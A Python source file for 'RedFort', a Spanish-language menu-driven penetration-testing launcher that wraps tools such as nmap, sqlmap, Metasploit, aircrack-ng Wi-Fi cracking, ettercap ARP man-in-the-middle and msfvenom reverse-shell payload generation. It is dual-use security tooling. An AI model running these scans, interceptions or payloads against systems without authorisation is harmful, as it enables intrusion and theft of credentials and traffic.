import os
import shutil
import re
import subprocess
import shodan
import requests
import pyfiglet
import datetime
import logging
import validators
from .utils import pause_before_return, safe_run, print_colored
from .session import save_log
from dotenv import load_dotenv

load_dotenv()
BASE_DIR       = os.getenv("BASE_DIR", "./reportes")
SHODAN_API_KEY = os.getenv("SHODAN_API_KEY")
ZAP_API_KEY    = os.getenv("ZAP_API_KEY")
BURP_API_KEY   = os.getenv("BURP_API_KEY")

os.makedirs(BASE_DIR, exist_ok=True)
logging.basicConfig(
    filename=os.path.join(BASE_DIR, "redfort.log"),
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s"
)
logger = logging.getLogger(__name__)

def pause_before_return(func):
    """
    Decorador que añade una pausa al final de cada herramienta
    para volver al menú principal.
    """
    def wrapper(*args, **kwargs):
        result = func(*args, **kwargs)
        print_colored("\nPresiona Enter para volver al menú principal", "yellow")
        input()
        return result
    return wrapper

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def safe_run(command, **kwargs):
    logger.info(f"Ejecutando: {' '.join(command)}")
    try:
        result = subprocess.run(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            **kwargs
        )
        if result.returncode != 0:
            logger.error(f"Error ({result.returncode}): {result.stderr.strip()}")
            print_colored(f"Error: {' '.join(command)}\n{result.stderr}", "red")
        return result
    except subprocess.TimeoutExpired as e:
        logger.error(f"Timeout ({e.timeout}s) en: {' '.join(command)}")
        print_colored(f"⏱ Timeout tras {e.timeout}s ejecutando: {' '.join(command)}", "yellow")
        return None
    except Exception as e:
        logger.exception(f"Fallo al ejecutar: {' '.join(command)}")
        print_colored(f"Excepción ejecutando {' '.join(command)}: {e}", "red")
        return None

def create_session():
    """
    Crea un directorio de sesión en:
      BASE_DIR/YYYY-MM-DD/HH-MM-SS[_descripcion]
    """
    # 1) Asegura BASE_DIR
    os.makedirs(BASE_DIR, exist_ok=True)

    # 2) Carpeta de fecha
    date_folder = datetime.datetime.now().strftime("%Y-%m-%d")
    date_dir = os.path.join(BASE_DIR, date_folder)
    os.makedirs(date_dir, exist_ok=True)

    # 3) Nombre de sesión (hora + descripción opcional)
    time_str = datetime.datetime.now().strftime("%H-%M-%S")
    desc = input("Descripción de la sesión (Enter = sólo hora): ").strip()
    safe_desc = desc.replace(" ", "_") if desc else ""
    session_name = f"{time_str}{'_'+safe_desc if safe_desc else ''}"
    session_dir = os.path.join(date_dir, session_name)
    os.makedirs(session_dir, exist_ok=True)

    logger.info(f"Sesión creada: {session_dir}")
    print_colored(f"Sesión creada: {session_dir}", "green")
    return session_dir

def prune_old_sessions(days=30):
    """
    Elimina carpetas de sesión con fecha anterior a 'days' días.
    """
    cutoff = datetime.datetime.now() - datetime.timedelta(days=days)
    for date_folder in os.listdir(BASE_DIR):
        try:
            folder_date = datetime.datetime.strptime(date_folder, "%Y-%m-%d")
        except ValueError:
            continue
        date_path = os.path.join(BASE_DIR, date_folder)
        if folder_date < cutoff:
            shutil.rmtree(date_path)
            logger.info(f"Eliminada sesión antigua: {date_path}")

def list_sessions():
    """
    Imprime en pantalla todas las sesiones agrupadas por fecha YYYY-MM-DD.
    Omite carpetas antiguas sin guiones.
    """
    date_pattern = re.compile(r"^\d{4}-\d{2}-\d{2}$")
    for date_folder in sorted(os.listdir(BASE_DIR)):
        if not date_pattern.match(date_folder):
            continue
        date_path = os.path.join(BASE_DIR, date_folder)
        print_colored(f"\nFecha: {date_folder}", "blue")
        for ses in sorted(os.listdir(date_path)):
            print(f"  • {ses}")

def gather_sessions():
    """
    Devuelve lista de tuplas (ruta_completa, etiqueta) para cada sesión en BASE_DIR.
    Etiqueta: YYYY-MM-DD/HH‑MM‑SS[_desc]
    """
    sessions = []
    date_pattern = re.compile(r"^\d{4}-\d{2}-\d{2}$")
    for date_folder in sorted(os.listdir(BASE_DIR)):
        if not date_pattern.match(date_folder):
            continue
        date_path = os.path.join(BASE_DIR, date_folder)
        for ses in sorted(os.listdir(date_path)):
            sessions.append((
                os.path.join(date_path, ses),
                f"{date_folder}/{ses}"
            ))
    return sessions

def delete_sessions():
    """Muestra las sesiones y permite eliminar la seleccionada."""
    sessions = gather_sessions()
    if not sessions:
        print_colored("No hay sesiones para eliminar.", "yellow")
        input("Enter para continuar…")
        return
    print_colored("\n== Eliminar Sesiones ==", "blue")
    for i, (_, label) in enumerate(sessions, 1):
        print(f"{i}. {label}")
    choice = input("Número de sesión a eliminar (0=Cancelar): ").strip()
    if choice == "0":
        return
    if not choice.isdigit() or not (1 <= int(choice) <= len(sessions)):
        print_colored("Selección no válida.", "red")
        return
    path, label = sessions[int(choice)-1]
    confirm = input(f"¿Eliminar {label}? (s/N): ").lower()
    if confirm == "s":
        shutil.rmtree(path)
        print_colored(f"Sesión {label} eliminada.", "green")
        logger.info(f"Sesión eliminada: {path}")

def select_or_create_session():
    """
    Menú inicial: elegir sesión existente, crear nueva o eliminar sesiones.
    Devuelve la ruta de session_dir seleccionada/creada.
    """
    while True:
        sessions = gather_sessions()
        print_colored("\n=== Sesiones Disponibles ===", "green")
        for i, (_, label) in enumerate(sessions, 1):
            print(f"{i}. {label}")
        print("0. Nueva sesión")
        print("D. Eliminar sesiones")
        opt = input("Selecciona opción: ").strip().lower()
        if opt == "0":
            return create_session()
        if opt == "d":
            delete_sessions()
            continue
        if opt.isdigit() and 1 <= int(opt) <= len(sessions):
            return sessions[int(opt)-1][0]
        print_colored("Opción no válida.", "yellow")

def save_log(session_dir, tool_name, output):
    """Guarda la salida de una herramienta en session_dir/{tool_name}.txt"""
    log_file = os.path.join(session_dir, f"{tool_name}.txt")
    try:
        with open(log_file, "w", encoding="utf-8") as f:
            f.write(output or "")
        logger.info(f"[LOG] {tool_name} → {log_file}")
    except Exception as e:
        logger.error(f"Error guardando {tool_name}: {e}")
        print_colored(f"Error al guardar {tool_name}: {e}", "red")

def generate_report(session_dir):
    """
    Concatena todos los .txt de session_dir en consolidated_report.txt,
    ignorando el propio consolidated_report.txt.
    """
    print_colored("\nGenerando reporte consolidado…", "blue")
    report_path = os.path.join(session_dir, "consolidated_report.txt")
    try:
        with open(report_path, "w", encoding="utf-8") as report:
            report.write(f"Reporte de sesión: {session_dir}\n")
            report.write("=" * 40 + "\n")
            for fname in sorted(os.listdir(session_dir)):
                if not fname.endswith(".txt") or fname == os.path.basename(report_path):
                    continue
                report.write(f"\n--- {fname} ---\n")
                with open(os.path.join(session_dir, fname), "r", encoding="utf-8") as f:
                    report.write(f.read())
                report.write("\n" + "=" * 40 + "\n")

        print_colored(f"Reporte generado: {report_path}", "green")
        logger.info(f"[REPORT] Consolidado → {report_path}")
    except Exception as e:
        logger.error(f"Error generando reporte: {e}")
        print_colored(f"Error generando reporte: {e}", "red")

def print_colored(text, color="red"):
    colors = {
        "red": "\033[31m", "green": "\033[32m",
        "yellow": "\033[33m","blue": "\033[34m","reset": "\033[0m"
    }
    print(f"{colors.get(color,colors['red'])}{text}{colors['reset']}")

def input_non_empty(prompt):
    """
    Solicita una entrada no vacía y válida (IP o dominio).
    """
    while True:
        value = input(prompt).strip()
        if not value:
            print_colored("La entrada no puede estar vacía.", "yellow")
            continue
        if validators.ipv4(value) or validators.ipv6(value) or validators.domain(value):
            return value
        print_colored("Valor no válido. Introduce IP o dominio correcto.", "yellow")

def check_and_install_dependencies():
    """Verifica y, si es necesario, instala las dependencias necesarias."""
    dependencies = [
        "figlet", "nmap", "amass", "shodan", "nikto", 
        "gobuster", "whatweb", "aircrack-ng", "ettercap", 
        "hydra", "hashcat", "theHarvester", "msfvenom"
    ]
    
    for package in dependencies:
        try:
            subprocess.check_call(["which", package], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{package} ya está instalado.")
        except subprocess.CalledProcessError:
            print(f"{package} no encontrado. Instalando...")
            try:
                subprocess.run(["sudo", "apt", "install", "-y", package], check=True)
                print(f"{package} instalado correctamente.")
            except subprocess.CalledProcessError as e:
                print(f"Error al instalar {package}: {e}")
            except FileNotFoundError:
                print(f"El gestor de paquetes 'apt' no se encuentra disponible. Instálalo primero.")

### 1 Reconocimiento ###

@pause_before_return
def run_nmap(target, scan_type="default", session_dir=None):
    """
    Ejecuta un escaneo Nmap optimizado según el tipo de escaneo seleccionado.
    Guarda los resultados en el directorio de sesión.
    :param target: IP o dominio objetivo.
    :param scan_type: Tipo de escaneo ("default", "quick", "stealth", "detailed").
    :param session_dir: Directorio de la sesión actual.
    """
    print(f"Ejecutando Nmap en {target} con el modo '{scan_type}'...")

    scan_modes = {
        "default": ["nmap", "-sS", "-T4", "-A", "-p-", target],
        "quick": ["nmap", "-p-", "--open", "-T4", "--min-rate", "5000", "-vv", "-n", "-Pn", target],
        "stealth": ["nmap", "-sS", "-T2", "-p-", "-n", target],
        "detailed": ["nmap", "-sS", "-T4", "-A", "-p-", "-vv", target],
    }

    if scan_type not in scan_modes:
        print("Tipo de escaneo no válido. Usando el modo 'default'.")
        scan_type = "default"

    command = scan_modes[scan_type]
    result = subprocess.run(command, stdout=subprocess.PIPE, text=True)

    file_name = f"nmap_{scan_type}_results.txt"
    if session_dir:
        save_log(session_dir, file_name, result.stdout)
    else:
        with open(file_name, "w") as file:
            file.write(result.stdout)

    print(f"Resultados guardados en {file_name}")

@pause_before_return
def run_amass(domain, session_dir=None):
    """
    Ejecuta Amass para recolectar subdominios y guarda los resultados.
    """
    result = subprocess.run(
        ["amass", "enum", "-d", domain],
        stdout=subprocess.PIPE, text=True
    )
    file_name = f"amass_results_{domain}.txt"
    if session_dir:
        save_log(session_dir, file_name, result.stdout)
    else:
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(result.stdout)

    print(f"Resultados guardados en {file_name}")

@pause_before_return
def run_shodan_search(ip, session_dir=None):
    """
    Busca información en Shodan para una IP y guarda los resultados.
    """
    print(f"Buscando información sobre {ip} en Shodan...")
    try:
        api = shodan.Shodan(SHODAN_API_KEY)
        host = api.host(ip)

        file_name = f"shodan_results_{ip}.txt"
        if session_dir:
            save_log(session_dir, file_name, str(host))
        else:
            with open(file_name, "w") as file:
                file.write(str(host))

        print(f"Resultados guardados en {file_name}")

    except shodan.APIError as e:
        print(f"Error con la API de Shodan: {e}")

### 2 Análisis de Vulnerabilidades ###

@pause_before_return
def run_nikto(target, session_dir=None):
    print("0. Volver al menú principal")
    if input("Pulsa 0 y Enter para volver, o Enter para continuar: ") == "0":
        return
    """
    Escaneo Nikto con tuning rápido y streaming de salida.
    """
    print(f"Ejecutando Nikto en {target} (tuning rápido)...")
    cmd = [
        "nikto",
        "-h", target,
        "-Tuning", "1",     # solo pruebas básicas
        "-Display", "V",    # muestra cada vulnerabilidad al vuelo
        "-timeout", "10"    # timeout de socket en segundos
    ]
    # usamos Popen para ver salida en directo
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        output = []
        for line in proc.stdout:
            print(line, end="")   # streaming
            output.append(line)
        proc.wait(timeout=300)     # matamos si pasa de 5 minutos
    except subprocess.TimeoutExpired:
        print_colored("Nikto ha superado el tiempo límite (5 min). Abortando.", "yellow")
        proc.kill()
    except Exception as e:
        print_colored(f"Error lanzando Nikto: {e}", "red")
        return

    if proc.returncode == 0:
        print_colored("Nikto ha terminado de analizar.", "green")
        results = "".join(output)
        file_name = f"nikto_results_{target}.txt"
        if session_dir:
            save_log(session_dir, file_name, results)
        else:
            with open(file_name, "w") as f:
                f.write(results)
        print(f"Resultados guardados en {file_name}")
    else:
        print_colored(f"Nikto terminó con código {proc.returncode}", "red")

@pause_before_return
def run_whatweb(target, session_dir=None):
    print("0. Volver al menú principal")
    if input("Pulsa 0 y Enter para volver, o Enter para continuar: ") == "0":
        return
    """
    Ejecuta WhatWeb en el objetivo especificado y guarda los resultados en la carpeta de sesión.
    :param target: URL o IP objetivo.
    :param session_dir: Directorio de la sesión actual.
    """
    print(f"Ejecutando WhatWeb en {target}...")
    result = subprocess.run(["whatweb", target], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    if result.returncode == 0:
        print("WhatWeb ha terminado de analizar.")
        file_name = f"whatweb_results_{target}.txt"
        if session_dir:
            save_log(session_dir, file_name, result.stdout)
        else:
            with open(file_name, "w") as file:
                file.write(result.stdout)
        print(f"Resultados guardados en {file_name}")
    else:
        print(f"Hubo un error al intentar ejecutar WhatWeb: {result.stderr}")

### 3 Pentesting WEB ###

@pause_before_return
def run_gobuster(target, wordlist, session_dir=None):
    print("0. Volver al menú principal")
    if input("Pulsa 0 y Enter para volver, o Enter para continuar: ") == "0":
        return
    """
    Ejecuta Gobuster para escaneo de directorios o subdominios y guarda los resultados.
    :param target: URL objetivo.
    :param wordlist: Ruta al archivo de wordlist.
    :param session_dir: Directorio de la sesión actual.
    """
    print(f"Ejecutando Gobuster en {target} con el wordlist {wordlist}...")
    result = subprocess.run(["gobuster", "dir", "-u", target, "-w", wordlist], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    if result.returncode == 0:
        print("Gobuster ha terminado el escaneo.")
        file_name = f"gobuster_results_{target}.txt"
        if session_dir:
            save_log(session_dir, file_name, result.stdout)
        else:
            with open(file_name, "w") as file:
                file.write(result.stdout)
    else:
        print(f"Hubo un error al intentar ejecutar Gobuster: {result.stderr}")

@pause_before_return
def run_owasp_zap(target, session_dir=None):
    print("0. Volver al menú principal")
    if input("Pulsa 0 y Enter para volver, o Enter para continuar: ") == "0":
        return
    """
    Ejecuta OWASP ZAP para escaneo de seguridad web a través de su API y guarda los resultados.
    Omite el apikey si no está configurado en .env.
    """
    print(f"Ejecutando OWASP ZAP en {target}...")
    zap_url = "http://127.0.0.1:8080"
    params = {"url": target}
    if ZAP_API_KEY:
        params["apikey"] = ZAP_API_KEY

    response = requests.get(f"{zap_url}/JSON/ascan/action/scan", params=params)
    if response.status_code == 200:
        message = f"Escaneo iniciado en {target}. Espera a que ZAP termine."
        print(message)
        if session_dir:
            save_log(session_dir, f"zap_results_{target}.txt", message)
    else:
        error_message = f"Error al ejecutar el escaneo en ZAP: {response.text}"
        print(error_message)
        if session_dir:
            save_log(session_dir, f"zap_error_{target}.txt", error_message)

@pause_before_return
def run_burp_suite(target, session_dir=None):
    print("0. Volver al menú principal")
    if input("Pulsa 0 y Enter para volver, o Enter para continuar: ") == "0":
        return
    """
    Ejecuta Burp Suite para escaneo de seguridad web a través de su API y guarda los resultados.
    Omite el apikey si no está configurado en .env (sólo disponible en Burp Pro + REST API).
    """
    print(f"Ejecutando Burp Suite en {target}...")
    burp_url = "http://127.0.0.1:8080"
    params = {"url": target}
    if BURP_API_KEY:
        params["apikey"] = BURP_API_KEY

    response = requests.get(f"{burp_url}/burp-api/v1/scan", params=params)
    if response.status_code == 200:
        message = f"Escaneo iniciado en {target} con Burp Suite."
        print(message)
        if session_dir:
            save_log(session_dir, f"burp_results_{target}.txt", message)
    else:
        error_message = f"Error al ejecutar el escaneo en Burp Suite: {response.text}"
        print(error_message)
        if session_dir:
            save_log(session_dir, f"burp_error_{target}.txt", error_message)

@pause_before_return
def run_sqlmap(target, session_dir=None):
    print("0. Volver al menú principal")
    if input("Pulsa 0 y Enter para volver, o Enter para continuar: ") == "0":
        return
    """
    Ejecuta sqlmap para escaneo de vulnerabilidades SQLi y guarda los resultados.
    :param target: URL objetivo.
    :param session_dir: Directorio de la sesión actual.
    """
    print(f"Escaneando vulnerabilidades SQLi en {target} con sqlmap...")
    result = subprocess.run(["sqlmap", "-u", target, "--batch"], stdout=subprocess.PIPE, text=True)

    file_name = f"sqlmap_results_{target}.txt"
    if session_dir:
        save_log(session_dir, file_name, result.stdout)
    else:
        with open(file_name, "w") as file:
            file.write(result.stdout)

    print(f"Resultados guardados en {file_name}")

@pause_before_return
def run_xsstrike(target, session_dir=None):
    print("0. Volver al menú principal")
    if input("Pulsa 0 y Enter para volver, o Enter para continuar: ") == "0":
        return
    """
    Ejecuta XSStrike para escaneo de vulnerabilidades XSS y guarda los resultados.
    :param target: URL objetivo.
    :param session_dir: Directorio de la sesión actual.
    """
    print(f"Escaneando vulnerabilidades XSS en {target} con XSStrike...")
    result = subprocess.run(["python3", "xsstrike.py", "-u", target], stdout=subprocess.PIPE, text=True)

    file_name = f"xsstrike_results_{target}.txt"
    if session_dir:
        save_log(session_dir, file_name, result.stdout)
    else:
        with open(file_name, "w") as file:
            file.write(result.stdout)

    print(f"Resultados guardados en {file_name}")

### 4 Explotación ###

@pause_before_return
def run_metasploit():
    print("0. Volver al menú principal")
    if input("Pulsa 0 y Enter para volver, o Enter para continuar: ") == "0":
        return
    """Ejecuta Metasploit Framework (requiere instalación previa)."""
    print("Ejecutando Metasploit Framework...")
    result = subprocess.run(["msfconsole"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    if result.returncode == 0:
        print("Metasploit ha arrancado correctamente.")
    else:
        print(f"Hubo un error al intentar ejecutar Metasploit: {result.stderr}")

def run_beef():
    """Ejecuta BeEF (requiere instalación previa)."""
    print("Ejecutando BeEF...")
    result = subprocess.run(["./beef"], cwd="/ruta/a/beef", stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    if result.returncode == 0:
        print("BeEF ha arrancado correctamente.")
    else:
        print(f"Hubo un error al intentar ejecutar BeEF: {result.stderr}")

def run_empire():
    """Ejecuta Empire (requiere instalación previa)."""
    print("Ejecutando Empire...")
    result = subprocess.run(["./empire"], cwd="/ruta/a/empire", stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    if result.returncode == 0:
        print("Empire ha arrancado correctamente.")
    else:
        print(f"Hubo un error al intentar ejecutar Empire: {result.stderr}")

### 5 Mobile Pentesting ###

@pause_before_return
def run_mobsf(session_dir=None):
    print("0. Volver al menú principal")
    if input("Pulsa 0 y Enter para volver, o Enter para continuar: ") == "0":
        return
    """Ejecuta MobSF para análisis de aplicaciones móviles y guarda los logs."""
    print("Ejecutando MobSF...")
    result = subprocess.run(["python3", "manage.py", "runserver"], cwd="/ruta/a/mobsf", stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    if result.returncode == 0:
        message = "MobSF ha arrancado correctamente en http://127.0.0.1:8000.\nUsa la interfaz web para subir y analizar aplicaciones móviles."
        print(message)
        if session_dir:
            save_log(session_dir, "mobsf_startup.txt", message)
    else:
        error_message = f"Hubo un error al intentar ejecutar MobSF: {result.stderr}"
        print(error_message)
        if session_dir:
            save_log(session_dir, "mobsf_error.txt", error_message)

@pause_before_return
def run_drozer(session_dir=None):
    print("0. Volver al menú principal")
    if input("Pulsa 0 y Enter para volver, o Enter para continuar: ") == "0":
        return
    """Ejecuta Drozer para análisis de seguridad en aplicaciones Android y guarda los logs."""
    print("Ejecutando Drozer...")
    result = subprocess.run(["drozer", "console", "connect"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    if result.returncode == 0:
        message = "Drozer se ha conectado correctamente al dispositivo Android."
        print(message)
        if session_dir:
            save_log(session_dir, "drozer_results.txt", message)
    else:
        error_message = f"Hubo un error al intentar ejecutar Drozer: {result.stderr}"
        print(error_message)
        if session_dir:
            save_log(session_dir, "drozer_error.txt", error_message)

### 6 Pentesting RED ###

@pause_before_return
def run_aircrack_ng(session_dir=None):
    print("0. Volver al menú principal")
    if input("Pulsa 0 y Enter para volver, o Enter para continuar: ") == "0":
        return
    """Ejecuta Aircrack-ng para auditoría de redes Wi-Fi y guarda los resultados."""
    print("\n--- Aircrack-ng ---")
    interface = input("Introduce la interfaz de red (ej. wlan0): ")
    subprocess.run(["sudo", "airmon-ng", "start", interface])

    capture_file = input("Introduce el nombre para el archivo de captura (ej. capture.cap): ")
    channel = input("Introduce el canal (ej. 1-13 o 'all' para escanear todos los canales): ")
    subprocess.run(["sudo", "airodump-ng", "-c", channel, "--write", capture_file, interface])
    
    wordlist = input("Introduce la ruta al archivo de diccionario (wordlist): ")
    bssid = input("Introduce el BSSID de la red a crackear (dirección MAC): ")
    result = subprocess.run(["sudo", "aircrack-ng", "-w", wordlist, "-b", bssid, f"{capture_file}-01.cap"], stdout=subprocess.PIPE, text=True)

    if session_dir:
        save_log(session_dir, "aircrack_results.txt", result.stdout)

@pause_before_return
def run_ettercap(session_dir=None):
    print("0. Volver al menú principal")
    if input("Pulsa 0 y Enter para volver, o Enter para continuar: ") == "0":
        return
    """Ejecuta Ettercap para análisis de redes y ataques MITM y guarda los logs."""
    print("\n--- Ettercap ---")
    
    mode = input("Selecciona el modo de ejecución:\n1. Modo texto\n2. Modo gráfico (GUI)\nSelecciona (1 o 2): ")
    
    if mode == "1":
        target1 = input("Introduce la IP del primer objetivo: ")
        target2 = input("Introduce la IP del segundo objetivo: ")
        result = subprocess.run(["sudo", "ettercap", "-T", "-M", "arp:remote", f"/{target1}/", f"/{target2}/"], stdout=subprocess.PIPE, text=True)
        
        if session_dir:
            save_log(session_dir, "ettercap_results.txt", result.stdout)

    elif mode == "2":
        print("Ejecutando Ettercap en modo gráfico...")
        subprocess.run(["sudo", "ettercap", "-G"])

### Payloads ###

@pause_before_return
def generate_payload(session_dir):
    print("0. Volver al menú principal")
    if input("Pulsa 0 y Enter para volver, o Enter para continuar: ") == "0":
        return
    """Genera un payload utilizando msfvenom y lo guarda en la carpeta de sesión."""
    lhost = input("Introduce la dirección IP (LHOST): ")
    lport = input("Introduce el puerto (LPORT): ")
    payload = input("Introduce el tipo de payload (ej. windows/meterpreter/reverse_tcp): ")
    output_file = os.path.join(session_dir, "payload.exe")
    print(f"Generando payload en {output_file}...")
    subprocess.run(["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", "exe", "-o", output_file])
    print("Payload generado exitosamente.")

### Figlet ###
def print_header():
    """Imprime el encabezado del menú principal con figlet."""
    clear()
    print("=" * 24)
    figlet_text = pyfiglet.figlet_format("RedFort")
    print(f"\033[31m{figlet_text}\033[0m")
    print("                        by GarboX0")
    print("=" * 24)

## Función de ayuda ##
def print_help():
    print_colored("\n== Ayuda RedFort_V2 ==\n", "blue")
    print("Navegación:")
    print(" • Teclea el número de la opción y Enter.")
    print(" • En cualquier submenú, 0 para volver al menú anterior.")
    print("\nHerramientas y recursos:")
    print(" • Nmap       → https://nmap.org")
    print(" • Amass      → https://github.com/OWASP/Amass")
    print(" • Shodan     → https://shodan.io")
    print(" • Nikto      → https://cirt.net/Nikto2")
    print(" • WhatWeb    → https://github.com/urbanadventurer/WhatWeb")
    print(" • Gobuster   → https://github.com/OJ/gobuster")
    print(" • ZAP        → https://owasp.org/www-project-zap/")
    print(" • Burp Suite → https://portswigger.net/burp")
    print(" • sqlmap     → https://sqlmap.org")
    print(" • XSStrike   → https://github.com/s0md3v/XSStrike")
    print(" • Metasploit → https://metasploit.com")
    print(" • BeEF       → https://github.com/beefproject/beef")
    print(" • Empire     → https://github.com/EmpireProject/Empire")
    print(" • MobSF      → https://github.com/MobSF/Mobile-Security-Framework-MobSF")
    print(" • Drozer     → https://github.com/FSecureLABS/drozer")
    print(" • Aircrack-ng→ https://www.aircrack-ng.org")
    print(" • Ettercap   → https://www.ettercap-project.org")
    print(" • msfvenom   → https://metasploit.com/download")
    print_colored("\nPresiona Enter para volver al menú principal", "yellow")
    input()

# ——— Menús especializados ———

def recon_menu(session_dir):
    """Menú de Reconocimiento: Nmap, Amass, Shodan."""
    while True:
        print_colored("\n== Reconocimiento ==", "blue")
        print("0. Volver")
        print("1. Nmap")
        print("2. Amass")
        print("3. Shodan")
        opt = input("Elige una opción: ").strip()
        if opt == "0":
            break
        elif opt == "1":
            # Sub‑menú Nmap
            print("Modos de escaneo Nmap:")
            print(" 0. Volver")
            print(" 1. default")
            print(" 2. quick")
            print(" 3. stealth")
            print(" 4. detailed")
            modo = input("Selecciona modo (número): ").strip()
            if modo == "0":
                continue
            scan_map = {"1":"default","2":"quick","3":"stealth","4":"detailed"}
            scan_type = scan_map.get(modo, "default")
            target = input("IP o dominio (o 0 para volver): ").strip()
            if target == "0":
                continue
            run_nmap(target, scan_type, session_dir)

        elif opt == "2":
            # Amass
            domain = input("Dominio (o 0 para volver): ").strip()
            if domain == "0":
                continue
            run_amass(domain, session_dir)

        elif opt == "3":
            # Shodan
            ip = input("IP (o 0 para volver): ").strip()
            if ip == "0":
                continue
            run_shodan_search(ip, session_dir)

        else:
            print_colored("Opción no válida.", "yellow")

def vuln_menu(session_dir):
    """Menú de Vulnerabilidades Web: Nikto, WhatWeb, Gobuster."""
    while True:
        print_colored("\n== Vulnerabilidades Web ==", "blue")
        print("0. Volver")
        print("1. Nikto")
        print("2. WhatWeb")
        print("3. Gobuster")
        opt = input("Elige una opción: ")
        if opt == "0":
            break
        elif opt == "1":
            target = input_non_empty("URL o IP: ")
            run_nikto(target, session_dir)
        elif opt == "2":
            target = input_non_empty("URL o IP: ")
            run_whatweb(target, session_dir)
        elif opt == "3":
            target   = input_non_empty("URL: ")
            wordlist = input_non_empty("Wordlist: ")
            run_gobuster(target, wordlist, session_dir)
        else:
            print_colored("Opción no válida.", "yellow")

def web_menu(session_dir):
    """Menú de Pentesting Web: ZAP, Burp, sqlmap, XSStrike."""
    while True:
        print_colored("\n== Pentesting Web ==", "blue")
        print("0. Volver")
        print("1. OWASP ZAP")
        print("2. Burp Suite")
        print("3. sqlmap")
        print("4. XSStrike")
        opt = input("Elige una opción: ")
        if opt == "0":
            break
        elif opt == "1":
            target = input_non_empty("URL: ")
            run_owasp_zap(target, session_dir)
        elif opt == "2":
            target = input_non_empty("URL: ")
            run_burp_suite(target, session_dir)
        elif opt == "3":
            target = input_non_empty("URL: ")
            run_sqlmap(target, session_dir)
        elif opt == "4":
            target = input_non_empty("URL: ")
            run_xsstrike(target, session_dir)
        else:
            print_colored("Opción no válida.", "yellow")

def exploit_menu():
    """Menú de Explotación: Metasploit, BeEF, Empire."""
    while True:
        print_colored("\n== Explotación ==", "blue")
        print("0. Volver")
        print("1. Metasploit")
        print("2. BeEF")
        print("3. Empire")
        opt = input("Elige una opción: ")
        if opt == "0":
            break
        elif opt == "1":
            run_metasploit()
        elif opt == "2":
            run_beef()
        elif opt == "3":
            run_empire()
        else:
            print_colored("Opción no válida.", "yellow")

def mobile_menu(session_dir):
    """Menú de Seguridad Móvil: MobSF, Drozer."""
    while True:
        print_colored("\n== Seguridad Móvil ==", "blue")
        print("0. Volver")
        print("1. MobSF")
        print("2. Drozer")
        opt = input("Elige una opción: ")
        if opt == "0":
            break
        elif opt == "1":
            run_mobsf(session_dir)
        elif opt == "2":
            run_drozer(session_dir)
        else:
            print_colored("Opción no válida.", "yellow")

def network_menu(session_dir):
    """Menú de Auditoría de Red: Aircrack-ng, Ettercap."""
    while True:
        print_colored("\n== Auditoría de Red ==", "blue")
        print("0. Volver")
        print("1. Aircrack-ng")
        print("2. Ettercap")
        opt = input("Elige una opción: ")
        if opt == "0":
            break
        elif opt == "1":
            run_aircrack_ng(session_dir)
        elif opt == "2":
            run_ettercap(session_dir)
        else:
            print_colored("Opción no válida.", "yellow")

# ——— Menú Principal ———
def main():
    check_and_install_dependencies()
    prune_old_sessions(days=30)           
    print("Sesiones existentes:"); list_sessions()
    session_dir = create_session()        
    while True:
        clear()
        print_header()
        print_colored("\n=== Menú Principal ===", "green")
        print("H. Ayuda")
        print("1. Reconocimiento")
        print("2. Vulnerabilidades Web")
        print("3. Pentesting Web")
        print("4. Explotación")
        print("5. Seguridad Móvil")
        print("6. Auditoría de Red")
        print("7. Generar Payloads")
        print("8. Reporte Consolidado")
        print("9. Salir")
        choice = input("Selecciona una opción: ")
        if choice == "h":
            print_help()
            continue
        elif choice == "1":
            recon_menu(session_dir)
        elif choice == "2":
            vuln_menu(session_dir)
        elif choice == "3":
            web_menu(session_dir)
        elif choice == "4":
            exploit_menu()
        elif choice == "5":
            mobile_menu(session_dir)
        elif choice == "6":
            network_menu(session_dir)
        elif choice == "7":
            generate_payload(session_dir)
        elif choice == "8":
            generate_report(session_dir)
        elif choice == "9":
            print_colored("Saliendo…", "yellow")
            break
        else:
            print_colored("Opción no válida.", "red")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_colored("\nInterrupción por usuario. Saliendo…", "yellow")
        logger.warning("Interrupción por usuario (Ctrl‑C)")
    except Exception:
        logger.exception("Error inesperado en main()")
        print_colored("Ha ocurrido un error. Revisa redfort.log para más detalles.", "red")